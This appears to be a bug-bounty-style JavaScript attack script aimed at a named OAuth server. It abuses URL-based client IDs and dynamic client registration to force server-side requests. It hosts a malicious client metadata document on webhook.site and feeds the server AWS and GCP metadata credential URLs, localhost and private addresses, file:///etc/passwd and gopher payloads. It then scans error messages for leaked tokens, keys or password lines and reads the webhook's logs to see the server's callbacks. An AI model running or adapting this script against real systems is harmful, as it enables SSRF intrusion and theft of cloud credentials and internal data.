const AS = "https://bugsecure-api.senintel.sn";
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const CH = "E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM";

const authorize = async (clientId, extra = [], label = "") => {
  const u = new URL(AS + "/oauth/authorize");
  u.searchParams.set("response_type", "code");
  u.searchParams.set("client_id", clientId);
  u.searchParams.set("redirect_uri", extra.find((e) => e[0] === "redirect_uri")?.[1] || "https://webhook.site/8d363fca-3a17-47b7-aa05-d0172a17f14d");
  u.searchParams.set("scope", "programs:read profile:read");
  u.searchParams.set("state", "bb-" + Math.random().toString(36).slice(2));
  u.searchParams.set("code_challenge", CH);
  u.searchParams.set("code_challenge_method", "S256");
  u.searchParams.set("resource", "https://bugsecure-api.senintel.sn");
  for (const [k, v] of extra) if (k !== "redirect_uri") u.searchParams.append(k, v);
  const r = await fetch(u, { redirect: "manual", headers: { "User-Agent": "bb-research/1.0" } });
  const loc = r.headers.get("location") || "";
  const body = (await r.text()).replace(/\s+/g, " ");
  const errDesc = (loc.match(/error_description=([^&]+)/) || body.match(/error_description=([^&" ]+)/) || [])[1] || "";
  const errCode = (loc.match(/[?&]error=([^&]+)/) || body.match(/[?&]error=([^&" ]+)/) || [])[1] || "";
  const consent = loc.includes("/oauth/consent");
  console.log("  " + (label || clientId).padEnd(52) + "HTTP " + r.status + (consent ? " CONSENT-OK" : "") + (errCode ? " err=" + errCode : ""));
  if (errDesc) console.log("        error_description: " + decodeURIComponent(errDesc).slice(0, 300));
  if (!consent && !errCode) console.log("        loc: " + loc.slice(0, 200));
  await sleep(1200);
  return { loc, body, errCode, errDesc };
};

console.log("=== 1) heberger un document de metadata client VALIDE sur un webhook dedie ===");
const wt = await (await fetch("https://webhook.site/token", { method: "POST" })).json();
const UUID = wt.uuid;
const BASE = "https://webhook.site/" + UUID;
console.log("  webhook dedie:", BASE);
const CIMD = {
  client_id: BASE,
  client_name: "bb-cimd-test",
  redirect_uris: [BASE + "/cb"],
  grant_types: ["authorization_code", "refresh_token"],
  response_types: ["code"],
  token_endpoint_auth_method: "none",
  scope: "programs:read profile:read",
  application_type: "web",
};
const put = await fetch("https://webhook.site/token/" + UUID, { method: "PUT", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ default_content: JSON.stringify(CIMD), default_content_type: "application/json" }) });
console.log("  publication du CIMD:", put.status);
await sleep(500);
const chk = await (await fetch(BASE)).text();
console.log("  contenu servi:", chk.slice(0, 120).replace(/\s+/g, " "));
await sleep(800);

console.log("\n=== 2) CIMD : le client_id URL est-il accepte comme client ? ===");
await authorize(BASE, [["redirect_uri", BASE + "/cb"]], "client_id = webhook (CIMD valide)");
await authorize(BASE, [], "client_id = webhook, redirect par defaut");

console.log("\n=== 3) EXFILTRATION : l erreur reflete-t-elle le corps recupere ? ===");
const SSRF = [
  ["metadata AWS IAM", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"],
  ["metadata AWS role", "http://169.254.169.254/latest/meta-data/iam/security-credentials/bugsecure"],
  ["metadata AWS identity", "http://169.254.169.254/latest/meta-data/iam/info"],
  ["metadata GCP", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"],
  ["localhost 80", "http://127.0.0.1/"],
  ["localhost 3000", "http://127.0.0.1:3000/"],
  ["localhost 8080", "http://127.0.0.1:8080/"],
  ["localhost 8099", "http://127.0.0.1:8099/"],
  ["localhost 53682 (MCP)", "http://127.0.0.1:53682/"],
  ["IPv6 loopback", "http://[::1]:80/"],
  ["file scheme", "file:///etc/passwd"],
  ["gopher", "gopher://127.0.0.1:80/_"],
  ["dict", "dict://127.0.0.1:80/x"],
  ["ip prive 10.x", "http://10.0.0.1/"],
  ["ip prive 172.16", "http://172.16.0.1/"],
  ["dns rebinding localtest", "http://localtest.me/"],
  ["cloudflare metadata", "http://169.254.169.254/computeMetadata/v1/"],
];
for (const [n, url] of SSRF) {
  const r = await authorize(url, [], "client_id = " + n);
  const d = decodeURIComponent(r.errDesc || "");
  if (/secret|token|AKIA|ASIA|root:|password/i.test(d)) console.log("        *** CONTENU SENSIBLE REFLETE ***");
}

console.log("\n=== 4) DCR avec client_uri : le document remplace-t-il les champs ? ===");
const reg = await fetch(AS + "/oauth/register", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ client_name: "bb-cimd-dcr", client_uri: BASE, redirect_uris: [BASE + "/cb2"] }) });
const regTxt = await reg.text();
console.log("  DCR+client_uri HTTP", reg.status, regTxt.slice(0, 300).replace(/\s+/g, " "));
await sleep(1200);
console.log("\n=== 5) le CIMD permet-il de contourner les regles DCR ? (redirect vers la plateforme) ===");
const reg2 = await fetch(AS + "/oauth/register", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ client_name: "bb-cimd-dcr2", client_uri: BASE, redirect_uris: ["https://bugsecure.senintel.sn/oauth/consent"] }) });
console.log("  DCR redirect plateforme HTTP", reg2.status, (await reg2.text()).replace(/\s+/g, " ").slice(0, 260));
await sleep(1200);
console.log("\n=== 6) requetes vues par le webhook (le fetch serveur est-il visible ?) ===");
const rl = await (await fetch("https://webhook.site/token/" + UUID + "/requests?sorting=newest")).json();
console.log("  total sur le webhook dedie:", rl.total);
for (const r of (rl.data || []).slice(0, 6)) console.log("   ", r.method, r.url.slice(0, 90), "| UA:", (r.headers?.["user-agent"] || [])[0]);
